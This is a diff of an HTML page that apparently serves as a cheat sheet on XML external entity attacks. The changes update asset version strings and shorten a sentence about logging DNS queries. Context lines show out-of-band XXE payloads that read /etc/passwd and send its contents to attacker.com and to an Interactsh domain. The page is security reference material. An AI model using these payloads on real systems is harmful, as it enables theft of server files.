@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=ac73a26">
+  <link rel="stylesheet" href="/assets/style.css?v=c627d42">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1533,7 +1533,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.attacker.com/'&gt;"&gt;
 %eval;
 %exfiltrate;</code></pre>
-<p>Monitor DNS queries on <code>attacker.com</code> to capture data. Tools like <code>dnsdumpster</code> or custom DNS servers can log the queries. Services like <strong>Interactsh</strong> also provide automatic DNS logging:</p>
+<p>Services like <strong>Interactsh</strong> provide automatic DNS logging:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.interactsh-domain.com/'&gt;"&gt;
 %eval;
@@ -1860,6 +1860,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=ac73a26" defer></script>
+  <script src="/assets/main.js?v=c627d42" defer></script>
 </body>
 </html>
